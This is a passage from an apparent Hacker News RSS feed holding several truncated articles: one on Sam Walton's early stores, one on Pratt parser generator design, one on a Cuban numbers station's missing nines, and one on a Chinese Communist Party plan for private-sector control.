</p><p><strong>Somehow over the years folks have gotten the impression that Walmart was something I dreamed up out of the blue as a middle-aged man, and that it was just this great idea that turned into an overnight success… </strong></p><p><strong>Like most overnight successes, it was about 20 years in the making.</strong></p><p>If you’re trying to build your own thing &amp; you want to learn from “the founder of Walmart”, looking at the start of the company itself is stupid because at that point he already had 15 years of experience</p><p>So let’s start with Sam’s very first store.</p><h3>The Biggest Mistake of&nbsp;Sam's Professional Life</h3><p>Sam started his retail career at 27 buying his 1st store, a “Ben Franklin” variety store franchise. </p><p>As a beginner he relied on the franchise’s playbook but also incorporated his own experiments. </p><p>Things like:</p><ul role="list"><li>putting popcorn &amp; ice cream machines in front of the store to drive traffic</li><li>doing huge discounts but actually making it up in volume (i.e. not ironically)</li><li>buying directly from manufactures instead of going through the franchise (which allowed for cheaper prices)</li></ul><p>He worked hard on that single store for 5 years, grew sales 3.5x to $250k/year and became the #1 Ben Franklin franchisee in his six-state region.</p><p>But then he found out he’d made a gigantic mistake.</p><p><strong><em>When he signed the store lease he didn’t include an option to renew it.</em></strong></p><p>The owner (a local department store competitor) saw his success &amp; refused to renew the lease at any price, thereby forcing Sam to shut down the store.</p><p>Imagine working on something for 5 years straight, becoming the best at it, and then having a single person end it all.</p><p>Sam was devastated:</p><p><strong><em>It was the lowpoint of my business life. I felt sick to my stomach. I couldn’t believe it was happening to me… I had built the best variety store in the whole region and worked hard in the community – done everything right – and now I was being kicked out of town. It didn’t seem fair. I blamed myself for ever getting suckered into such an awful lease, and I was furious at the landlord.</em></strong></p><p>He was mad, but he accepted responsibility:</p><p><strong><em>I’ve always thought of problems as challenges, and this one wasn’t any different… I had to pick myself up and get on with it, do it all over again, only even better this time.</em></strong></p><p>If Facebook or Google change their algorithms you at least get to keep your old customer base and your business assets.</p><p>But with a retail store you have none of that. </p><p>And because of the structure of the town they couldn’t just open another store somewhere nearby.</p><p>The Waltons literally had to pack up their family of 6 and go find a new town.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7090bddf371b5d9227_shadow_figures.jpeg" alt=""></p></figure><p>If he’d wanted to Sam had plenty of reasons to sulk: they were starting all over in a <em>smaller</em> town (Bentonville) that also had its fair share of competition (3 other variety stores). </p><p><strong>But Sam said “it didn’t matter much because I had big plans.”</strong></p><h3>Unsexy Determination</h3><p>Sam spent the next 12 years in what I call <em>narrative limbo</em>.</p><p>It’s the crucial part of any “overnight success” that doesn’t get covered in the Successful Entrepreneur genre.</p><p>No one writes about all the random tangents and mistakes you make here.</p><p>Like, say, that time Sam tried to start a shopping mall 10 years too early and lost $25,000? </p><p>Or what about the time a tornado destroyed his best performing store? All he had to say was “we just rebuilt it and got back at it.”</p><p>This is important to know if you’re trying to learn from Sam, but it doesn’t fit into any narrative.</p><p>The lesson here is that there will be mistakes and problems on any path to success. As a recent book title says, <a href="https://www.amazon.com/dp/B00G3L1B8K/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">those obstacles are the way itself.</a></p><p>A coworker said Sam excelled here because he woke up every day “determined to improve something”, and that he was</p><p><strong><em>less afraid of being wrong than anyone I’ve ever known…Once he sees he’s wrong, he just shakes it off and heads in another direction.</em></strong></p><p>You don’t get any of this from Reed Hastings when he talks about $40 late fees. You think “oh I need a great idea” when the reality is the idea is nothing and your psychology &amp; persistence is everything.</p><p>Eventually Sam got to 15 stores &amp; by 1960 was the largest independent variety store operator in the US, doing a a total of ~$12M (in 2018 dollars) in annual revenue.</p><h3>It Would Seem Obvious</h3><p>It was here that Sam finally saw the opportunity for much bigger discount stores and got to work on the 1st Walmart.</p><p>He was the most successful independent operator in the US &amp; had 15 years of experience in retail, surely it should have been easy for him to raise money from investors…?</p><p>Wrong.</p><p>Sam asked other store owners, entrepreneurs, competitors… basically everyone said no.</p><p>He got a measly 5% from his own brother &amp; a store manager and had to borrow the other 95% (signing their house and all their other stores as collateral).</p><p><strong><em>Even the great Sam Walton couldn’t find investors to start the 1st Walmart, on the back of a near-perfect record in retail.</em></strong></p><h3>The 1st Wal-Mart</h3><p>Finally, the point where most people look at to learn, is the end of our story.</p><p>The 1st Walmart was an ugly retail store (8-foot ceilings, concrete floor, wooden fixtures) but it worked because Walmart’s prices always beat competitors. </p><p>(Even the name “Walmart” was selected with customer prices in mind: it was cheaper to buy neon signs for 7 letters than the longer names Sam considered.)</p><p>And you think Sam cared 2 cents about what anyone else thought about his stores? </p><p>The New York Times doesn’t mention Sam or Walmart until 1969, 7 years after the 1st store opening, and he’s just one random quote in the back of the paper:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7098a06f34c1f02247_south.png" alt=""></p></figure><p>And the Walmart 1970 IPO got a <em>single</em> mention on page 44 of the Times:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7072644e0be8fffc12_nyt_walton.png" alt=""></p></figure><p>If you want to learn from entrepreneurs, look at the start not the finish.</p><p>This first appeared in my weekly newsletter <em>How It Actually Works</em>. <a href="https://www.howitactuallyworks.com/">Sign up to receive it here.</a></p></div></div></div>]]>
            </description>
            <link>https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513310</guid>
            <pubDate>Fri, 18 Sep 2020 05:32:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making a Pratt Parser Generator]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24513092">thread link</a>) | @todsacerdoti
<br/>
September 17, 2020 | https://www.robertjacobson.dev/designing-a-pratt-parser-generator | <a href="https://web.archive.org/web/*/https://www.robertjacobson.dev/designing-a-pratt-parser-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main" role="main">
    <div>

        <article>

            

            
            <figure>
            </figure>
            

            <section>
                <div>
                    <h2 id="a-brief-history-of-the-pratt-parsing-algorithm">A brief history of the Pratt parsing algorithm</h2>
<p>The history of programming language parsers is dominated by the thorny challenge of parsing expressions, mathematical expressions in particular, taking into account the pecedence of operators in the expressions. Modern formal language theory began with the work of Noam Chomsky in the 1950s, in which Chomsky lays out a mathematical framework for linguistics. Under this mathematical framework, languages exist within a heirarchy of langauges defined according to how difficult the language is to parse.<sup id="fnref:1"><a href="#fn:1">1</a></sup> But computer programmers needed practical, efficient algorithms to parse computer programs for translation to machine code. Parsers of the 1950s relied on ad hoc logic rather than systematic algorithms (a feature which persists to this day, though to a much lesser degree). The 1960s was a golden age of parsing algorithm research when nearly all of the concepts and algorithms we use today were discovered and rigorously studied. By the early 1970s, parsing theory had evolved to the point that  Stephen C. Johnson, a computer scientist at Bell Labs / AT&amp;T, was able to start work on YACC (now “Yacc”), “Yet Another Compiler Compiler.”<sup id="fnref:2"><a href="#fn:2">2</a></sup> YACC was first publically described in 1975 and shipped with Unix version 3<sup id="fnref:3"><a href="#fn:3">3</a></sup>  and is still in use today.</p>

<p>The thorny challenge of parsing expressions was partially solved in 1961 by the venerable shunting-yard algorithm described by Dutch computer scientist Edsger W. Dijkstra, which algorithm could efficiently parse binary infix operator expressions with a value stack and an operator stack, creating nodes from the bottom up. Vaughan R. Pratt generalized Dijkstra’s sunting-yard algorithm to parsing of entire languages, this time using a single stack, or using recursive descent with the call stack as an implicit stack, creating nodes from the top down. Pratt’s parsing algorithm overcomes a number of limitations with the shunting-yard algorithm and is simpler.</p>

<p>Precedence climbing was apparently first invented by Martin Richards in 1979<sup id="fnref:4"><a href="#fn:4">4</a></sup> for his BCPL compiler. Precedence climbing uses a single recursive function and a single table mapping token IDs to their precedence instead of Pratt’s mutual recursive descent and multiple tables. In fact, precedence climbing can be seen as a special case of Pratt parsing, though historically they have been understood as related but not identical.<sup id="fnref:5"><a href="#fn:5">5</a></sup><sup>,</sup><sup id="fnref:6"><a href="#fn:6">6</a></sup></p>

<p>Vaughan Pratt had described his algorithm six years earlier in 1973 at the very first meeting of POPL, the Symposium on Principles of Programming Languages, which remains among the most important conferences in the field. It is interesting to see what other papers are published in the 1973 POPL Proceedings. One finds, for example, Aho, S. C. Johnson, and J. D. Ullman’s “Deterministic parsing of ambiguous grammars,“<sup id="fnref:8"><a href="#fn:8">7</a></sup> and James H. Morris, Jr.’s “Types are not sets,”<sup id="fnref:9"><a href="#fn:9">8</a></sup> among papers by several other influential luminaries. Vaughan Pratt had been developing an alternative expression syntax for MACLISP called CGOL,<sup id="fnref:10"><a href="#fn:10">9</a></sup> which he needed to parse.</p>

<h2 id="parser-design">Parser design</h2>

<h3 id="the-typical-design">The typical design</h3>

<p>There are already many articles on the web describing the Pratt parsing algorithm. (I recommend <sup id="fnref:5:1"><a href="#fn:5">5</a></sup>.) If you are not familiar with the algorithm, go read up on it before returning here.</p>

<p>A typical object oriented design is to have a node class for each kind of AST node, each class implementing their own “parselet” method, traditionally named <code>led</code>  for “left donation” after Pratt’s original article, that is called by a driver algorithm and is responsible for parsing the node instance’s operands (children) by calling back into the driver before returning. Each class also keeps track of its associativity and precedence. The driver algorithm consumes a token, looks up the appropriate class in a table, creates an instance and calls its parslet method.</p>

<p>We can be a little bit more efficient by having only a handful of superclasses corresponding to each required (affix, associativity) combination. In the typical object-oriented Pratt-parser design, every operator would need a subclass of the form</p>

<div><div><pre><code><span>class</span> <span>Multiply</span><span>:</span> <span>public</span> <span>InfixLeftAssoc</span><span>{</span>
  <span>Multiply</span><span>(</span><span>Parser</span> <span>parser</span><span>,</span> <span>ASTNode</span> <span>left</span><span>,</span> <span>Token</span> <span>operator</span><span>)</span><span>:</span> 
  	<span>precedence</span><span>(</span><span>40</span><span>){</span>
		<span>super</span><span>(</span><span>parser</span><span>,</span> <span>left</span><span>,</span> <span>operator</span><span>);</span>
  <span>}</span>
  
  <span>T</span> <span>MultiplyMethodA</span><span>(</span><span>U</span> <span>param1</span><span>,</span> <span>V</span> <span>param2</span><span>){...}</span>
  <span>W</span> <span>MultiplyMethodB</span><span>(</span><span>X</span> <span>param1</span><span>,</span> <span>Y</span> <span>param2</span><span>){...}</span>
  <span>// etc.
</span><span>}</span>
</code></pre></div></div>

<p>This class establishes the Multiply operator as an infix, left associative operator. We have also initialized our operator precedence to 40. Again, the <code>InfixLeftAssoc</code> superclass and other ancestor classes compute left and right binding power (LBP and RBP) from the value of precedence and associativity and implement the <code>led</code> method (“left donation” parselette method) and any utility methods and members. This concrete subclass serves the following purposes:</p>

<ol>
  <li>encodes the affix (by specifying its superclass)</li>
  <li>encodes the associativity  (by specifying its superclass)</li>
  <li>records the precedence</li>
  <li>provides a home for <code>MultiplyMethodA</code> and <code>MultiplyMethodB</code></li>
</ol>

<p>But why are we using different classes at all? This OOP design has several flaws:</p>

<ul>
  <li>It violates the principle of separation of concerns: Why are AST nodes doing the work of the parser?</li>
  <li>It violates the DRY Principle: Unless you autogenerate the code, you need to write a class for every operator—even if you relegate the parslet code to a handful of superclasses.</li>
  <li>This parser design is littered with static data: operator tokens, constants for precedence, associativity, affix, and token IDs, all of which is redundant, as it exists in a table used by the driver algorithm anyway. (Ironically, it is precisely because of its object-oriented design that the code and the data it acts upon are so disparate. This is not entirely the fault of OOP per se but rather of a poor choice of what concepts should be materialized as objects.)</li>
  <li>Generalizing the previous point: This design fixes the language at compile time. If you want to change the precedence of an operator, you need to rewrite, recompile, and redeploy the parser.</li>
  <li>It is cumbersome to write an operator table statically: Unless the code is automatically generated, writing “<code>parser.registeroperator(op, prec, assoc, whatever)</code>,” the code that line depends on, and every subclass for every single operator is a bummer. Even if you autogenerate code, you have to write a code generator.</li>
</ul>

<p>❝The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place.❞</p>

<p>The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place. <em>In principle</em>, if code can automatically be generated, it can also be automatically compiled and executed. So maybe the (hypothetical) generate-compile-run pipeline (usually called a JIT or jitter) can be refactored to eliminate the compile step. In our case, instead of writing a bespoke Pratt parser in which the operator table is both encoded in the class hierarchy and generated again at runtime, why not write a generic Pratt parser that reads in the operator database at startup? As a bonus, modifying the language does not require a recompile: You can add, remove, or modify operators at <em>runtime</em> if you’d like, and maintaining the expression grammar is as simple as editing a value in a spreadsheet. (Indeed, it could be literally that!)</p>

<h3 id="operator-database">Operator Database</h3>

<p>As a toy example, we might have an operator database as follows.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>Operator</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td><code>"123"</code></td>
      <td><code>"Number"</code></td>
      <td>0</td>
      <td>None</td>
      <td>Null</td>
      <td>Nullary</td>
    </tr>
    <tr>
      <td>2</td>
      <td><code>"^"</code></td>
      <td><code>"Power"</code></td>
      <td>10</td>
      <td>Right</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>3</td>
      <td><code>"*"</code></td>
      <td><code>"Times"</code></td>
      <td>20</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>4</td>
      <td><code>"/"</code></td>
      <td><code>"Divide"</code></td>
      <td>20</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>5</td>
      <td><code>"+"</code></td>
      <td><code>"Plus"</code></td>
      <td>30</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>6</td>
      <td><code>"-"</code></td>
      <td><code>"Minus"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>The <code>TokenID</code> might be supplied by the lexer/scanner (many Pratt parsers are scanner-less) and will be used as the identifier. <code>Operator</code> and <code>NameString</code> are only used for printing output. The remaining columns are required to compute the left and right binding powers of each operator. In this example language, every operator is either a terminal (number) or a binary infix operator.</p>

<h3 id="more-sophisticated-operators">More Sophisticated Operators</h3>

<p>Suppose we have ternary, mixfix, or matchfix operators. Then we need to modify the operator database to reflect how the operator tokens appear in an expression. A portion of our operator table might now look like this.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>LToken</th>
      <th>NToken</th>
      <th>OToken</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>10</td>
      <td><code>"("</code></td>
      <td>&nbsp;</td>
      <td><code>")"</code></td>
      <td><code>"Parentheses"</code></td>
      <td>10</td>
      <td>Non</td>
      <td>Matchfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
    </tr>
    <tr>
      <td>43</td>
      <td><code>"["</code></td>
      <td>&nbsp;</td>
      <td><code>"]"</code></td>
      <td><code>"Index"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>44</td>
      <td>&nbsp;</td>
      <td><code>"!"</code></td>
      <td>&nbsp;</td>
      <td><code>"Factorial"</code></td>
      <td>40</td>
      <td>Left</td>
      <td>Postfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>46</td>
      <td>&nbsp;</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td><code>"UnaryMinus"</code></td>
      <td>50</td>
      <td>Right</td>
      <td>Prefix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>49</td>
      <td><code>"/"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Divide"</code></td>
      <td>60</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>55</td>
      <td><code>"?"</code></td>
      <td>&nbsp;</td>
      <td><code>":"</code></td>
      <td><code>"IfThenElse"</code></td>
      <td>70</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Ternary</td>
    </tr>
    <tr>
      <td>57</td>
      <td><code>"+"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Plus"</code></td>
      <td>80</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>60</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Minus"</code></td>
      <td>90</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>In this design, the database includes which tokens of the operator can take a left operand (<code>LToken</code>), can begin an expression (no left operand, <code>NToken</code>), or are included in some other position (<code>OToken</code>).</p>

<blockquote>
  <p>The <code>LToken</code>, <code>NToken</code>, <code>OToken</code>, <code>Affix</code>, and <code>Arity</code> can all be inferred from a single example usage, for example:
<code>op1 ? op2 : op3</code>
This suggests that there may be a way to generate a parser for an expression language using nothing but examples. Indeed, there is!</p>
</blockquote>

<p>To reiterate the point, this table of operators might live in a plaintext CSV file. At startup—not at compile time—the Pratt parser reads in the operator table. AST nodes know their identity by their <code>TokenID</code> (which is really an operator ID) or string representation and perform identity-specific actions via dynamic dispatch.</p>

<h3 id="dynamic-dispatch">Dynamic Dispatch</h3>

<p>That last sentence should have raised your suspicion. A fundamental benefit of this design, I claim, is that it keeps you from having to write boilerplate for every operator. Are we just shifting the boilerplate from the …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.robertjacobson.dev/designing-a-pratt-parser-generator">https://www.robertjacobson.dev/designing-a-pratt-parser-generator</a></em></p>]]>
            </description>
            <link>https://www.robertjacobson.dev/designing-a-pratt-parser-generator</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513092</guid>
            <pubDate>Fri, 18 Sep 2020 04:46:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512546">thread link</a>) | @wglb
<br/>
September 17, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512546</guid>
            <pubDate>Fri, 18 Sep 2020 03:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CCP announces plan to take control of China's private sector]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24511672">thread link</a>) | @apsec112
<br/>
September 17, 2020 | https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector | <a href="https://web.archive.org/web/*/https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        
        
      
        <h3>(ATF)Â&nbsp;Chinese President Xi Jinping and the Communist Party's Central Committee have laid out a plan for a â€˜new eraâ€™ in which the party has better control over private business in China. </h3><p><a href="http://www.xinhuanet.com/fortune/2020-09/15/c_1126497384.htm">The plan</a> was detailed in a 5,000-word statement â€“ and all regions and departments in the country have been told to follow the new guidelines.</p><p><span>This was the top story on Wednesday's CCTV Evening News â€“ how the president had issued â€œimportant instructionsâ€�.</span></p><p><span>It had a long-winded title: "Opinion on Strengthening the United Front Work of the Private Economy in the New Era".</span></p><p><span>The ultimate goal is for the party to have ideological leadership of private enterprise.</span></p><p><span>The statement seeks to improve CCP control over private enterprise and entrepreneurs through United Front Work â€œto better focus the wisdom and strengthen of the private businesspeople on the goal and mission to realise the great rejuvenation of the Chinese nation.â€�</span></p><p><span>Xi's instructions were issued ahead of a conference today on this very topic.Â&nbsp;</span>The party wants to see a "united front" between private enterprise and government business.</p><h3><figure><iframe frameborder="0" scrolling="no" allow="accelerometer; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" mozallowfullscreen="" webkitallowfullscreen="" oallowfullscreen="" msallowfullscreen="" allowtransparency="true" src="//player.vimeo.com/video/459459469"></iframe></figure>100 ways to rein in the private sector</h3><p>Since the 18th National Congress in May, members of the party's Central Committee and Comrade Xi have proposed a series of new concepts and strategies, and adopted a series of major measures to guide and promote private economic 'united front' work. They say these moves have achieved "remarkable results". </p><p>As Chinaâ€™s private economy has grown and diversified, the statement says "these measures will bring about a great rejuvenation of the Chinese nation under Xi Jinping thought".</p><p>Overall, there are more than 100 measures, including guidance on selection of personnel to implement the measures. </p><p>"We must also see that socialism with Chinese characteristics has entered a new era, [as] the scale of the private economy has continued to expand, risks and challenges have increased significantly, the values and interests of the private economy have become increasingly diverse, and the united front work of the private economy is facing new situations and tasks," the statement says.</p><p>"In order to thoroughly implement the major decisions and deployments of the Party Central Committee, to further strengthen the Party's leadership of the private economic united front work, and to better integrate the wisdom and strength of private economic personnel to the goal and task of achieving the great rejuvenation of the Chinese nation, the following opinions are hereby offered."</p><p>The primary stated significance of the measures is â€œenhancement of the partyâ€™s leadership over the private economy â€“ private economic figures are to be more closely united around the party.â€�</p><h3>More CCP involvement in business</h3><p>This is quite a turnaround. Previously, private business was not considered very worthy for party membership or influence, but it has gradually entered the heart of the regime.</p><p>According to the new provisions, private firms will need a certain amount of CCP registered employees, which is already a long-term practise in large private firms but not smaller ones. </p><p>These cadres will make sure businesses follow the guiding ideologyÂ&nbsp;â€œGuided by Xi Jinpingâ€™s Thought on Socialism with Chinese Characteristics for a New Era.â€� </p><p>They will also guide private business people to enhance the latest CCP catchphrases â€“ â€œfour consciousnessesâ€�, strengthen the â€œfour self-confidencesâ€�, and achieve the â€œtwo safeguards.â€�</p><p>Duties of cadres will include the duties of strengthening ideological guidance,Â&nbsp;guiding private economic figures to increase their awareness of self-discipline, build a strong line of ideological and moral defence, strictly regulate their own words and deeds, cultivate a healthy lifestyle, and create a good public image.Â&nbsp;</p><p>They will also need to continuously improve law abidance and moral standards of private citizens.Â&nbsp;</p><p>Communication channels will be set up between private business and the party to report back on progress and other matters.</p>
      
      
        <p>Tags:</p>
      
      </article></div>]]>
            </description>
            <link>https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511672</guid>
            <pubDate>Fri, 18 Sep 2020 00:33:21 GMT</pubDate>
        </item>
        <item>
            <title>
